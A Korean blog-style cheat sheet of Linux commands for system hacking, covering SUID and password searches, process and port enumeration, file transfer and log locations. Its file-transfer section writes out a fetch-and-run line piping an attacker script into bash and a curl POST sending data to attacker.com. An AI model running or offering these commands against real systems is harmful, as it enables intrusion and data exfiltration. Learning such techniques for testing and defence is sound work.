---
layout: post
title: "Linux Hacking Commands"
date: 2025-09-02 17:00:00 +0900
categories: [system-hacking]
---

## 1. 개요

**리눅스 명령어**는 시스템 해킹 및 보안 분석 과정에서 가장 기본적이면서도 강력한 무기이다.
GUI가 없는 서버 환경(Shell)에서 타겟 시스템의 정보를 수집하고, 취약점을 탐색하며, 권한 상승을 시도하기 위해서는 다양한 터미널 명령어를 능숙하게 다룰 수 있어야 한다.

### 주요 활용 분야
1.  **정보 수집 (Enumeration)**: 시스템 버전, 사용자 계정, 네트워크 상태 확인.
2.  **파일 탐색**: 설정 파일, 키 파일, SUID 파일 등 민감 정보 검색.
3.  **흔적 지우기 및 분석**: 로그 확인 및 정리.

---

## 2. 파일 탐색 (File Discovery)

### find
특정 속성을 가진 파일을 검색한다. 권한 상승 벡터인 **SUID** 파일이나 설정 오류를 찾을 때 핵심적인 역할을 한다.

```bash
# SUID 비트가 설정된 모든 파일 검색 (권한 상승 시도용)
find / -perm -u=s -type f 2>/dev/null

# 쓰기 권한이 있는 디렉터리 검색 (World Writable)
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

### grep
파일 내용에서 특정 패턴을 찾는다. 소스 코드나 설정 파일에서 하드코딩된 비밀번호를 찾을 때 유용하다.

```bash
# 재귀적으로 'password' 문자열 검색 (대소문자 무시)
grep -r -i "password" /var/www/html/

# 주석(#)을 제외한 설정 확인
grep -v "^#" /etc/ssh/sshd_config
```

---

## 3. 시스템 상태 확인 (System Status)

### ps (Process Status)
현재 실행 중인 프로세스를 확인하여, 루트 권한으로 실행 중인 취약한 서비스가 있는지 파악한다.

```bash
# 모든 프로세스 상세 출력
ps aux

# 특정 서비스(예: ssh) 확인
ps aux | grep ssh
```

### netstat / ss
네트워크 연결 상태와 열려 있는 포트를 확인한다.

```bash
# Listening 중인 TCP/UDP 포트와 프로세스 확인
ss -tulpn
# 또는
netstat -tulpn
```

---

## 4. 파일 전송 (File Transfer)

공격자 머신에서 타겟 머신으로 툴(Exploit, Script)을 전송하거나, 반대로 데이터를 유출할 때 사용한다.

### wget
```bash
# 공격자 웹 서버(Python http.server)에서 파일 다운로드
wget http://10.10.10.10:8000/linpeas.sh -O /tmp/linpeas.sh
```

### curl
```bash
# 파일 다운로드 및 실행 (파이프)
curl http://10.10.10.10/shell.sh | bash

# POST 요청으로 데이터 전송
curl -X POST -d "data=secret" http://attacker.com/log
```

---

## 5. 로그 분석 및 트러블슈팅

시스템 관리자는 침해 사고 분석을 위해, 공격자는 자신의 흔적을 확인하기 위해 로그를 분석한다.

### 주요 로그 파일 위치
| 로그 파일 | 설명 |
|-----------|------|
| `/var/log/auth.log` | 인증, 로그인, sudo 사용 기록 |
| `/var/log/syslog` | 시스템 전반적인 메시지 |
| `/var/log/apache2/access.log` | 웹 서버 접근 기록 |

### 분석 예시
```bash
# SSH 로그인 실패 기록 실시간 확인
tail -f /var/log/auth.log | grep "Failed password"

# 특정 IP의 웹 요청만 필터링
grep "192.168.1.50" /var/log/apache2/access.log
```

<hr class="short-rule">